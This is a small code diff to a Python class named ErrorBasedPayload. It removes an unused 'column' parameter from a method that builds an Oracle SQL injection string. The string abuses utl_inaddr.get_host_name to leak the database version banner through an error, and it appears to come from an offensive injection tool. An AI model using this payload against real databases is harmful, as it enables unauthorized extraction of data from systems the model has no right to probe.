@@ -1,6 +1,6 @@
 class ErrorBasedPayload:
     @staticmethod
-    def http_error_req(table,column):
+    def http_error_req(table):
         payload = f"""
 	SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM {table}
 """
